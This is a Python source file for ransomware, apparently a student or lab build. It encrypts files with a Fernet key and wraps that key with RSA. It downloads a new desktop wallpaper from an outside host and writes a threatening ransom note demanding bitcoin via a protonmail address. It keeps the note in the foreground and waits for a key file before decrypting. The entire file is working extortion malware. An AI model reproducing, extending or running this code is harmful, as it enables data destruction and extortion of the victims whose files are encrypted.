# Imports
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os # to get system root
import webbrowser # to load webbrowser to go to specific website eg bitcoin
import ctypes # so we can interact with windows dlls and change windows background etc
import urllib.request # used for downloading and saving background image
import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to create process for notepad and open ransom note
import win32gui # used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64
import threading # used for ransom note and decryption key on dekstop



class RansomWare:

    
    # File exstensions to seek out and Encrypt
    file_exts = [
        'txt'
    #    'jpg',
    #    'mp4' 

    ]

    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None

        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = r'D:\PTIT\python\target_pc\Desktop'
        
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        self.localRoot = r'D:\PTIT\python\target_pc\test_folder' # Debugging/Testing


    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generate_key(self):
        # Generates a url safe(base64 encoded) key
        self.key =  Fernet.generate_key()
        # Creates a Fernet object with encrypt/decrypt methods
        self.crypter = Fernet(self.key)

    
    # Write the fernet(symmetric key) to text file
    def write_key(self):
        dir_path = os.path.dirname(os.path.realpath(__file__))
        sep = os.sep

        with open(dir_path + sep + 'fernet_key.txt', 'wb') as f:
            f.write(self.key)


    def encrypt_fernet_key(self):
        dir_path = os.path.dirname(os.path.realpath(__file__))
        sep = os.sep

        with open(dir_path + sep + 'fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open(dir_path + sep + 'fernet_key.txt', 'wb') as f:
            # Public RSA key
            dir_path = os.path.dirname(os.path.realpath(__file__))
            sep = os.sep
            with open(dir_path + sep + 'public.pem', encoding='utf-8') as public_f:
                key = public_f.read()
            self.public_key = RSA.import_key(key)
            # Public encrypter object
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # Write encrypted fernet key to file
            f.write(enc_fernent_key)
        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sysRoot}/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # Remove fernet crypter object
        self.crypter = None


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.crypter.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print('> File encrpyted')
                print(_data)
            else:
                # Decrypt data from file
                _data = self.crypter.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        # Open browser to the https://bitcoin.org so they know what bitcoin is
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        dir_path = os.path.dirname(os.path.realpath(__file__))
        sep = os.sep

        date = datetime.date.today().strftime('%d-%B-Y')
        dir_path = os.path.dirname(os.path.realpath(__file__))
        with open(dir_path + os.sep + 'RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')


    def show_ransom_note(self):
        dir_path = os.path.dirname(os.path.realpath(__file__))
        sep = os.sep

        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', dir_path + sep + 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', dir_path + sep + 'RANSOM_NOTE.txt'])
            # sleep for 10 seconds
            time.sleep(60)
            count +=1 
            if count == 5:
                break

    
    # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
    def put_me_on_desktop(self):
        print('started') # Debugging/Testing
        while True:
            try:
                print('trying') # Debugging/Testing
                with open(f'{self.sysRoot}/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print('decrypted') 
                    break
            except Exception as e:
                print(e) 
                pass
            time.sleep(10)
            print('Checking for PUT_ME_ON_DESKTOP.txt') 



def main():
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
    print('> RansomWare: Completed') # Debugging/Testing



if __name__ == '__main__':
    main()
 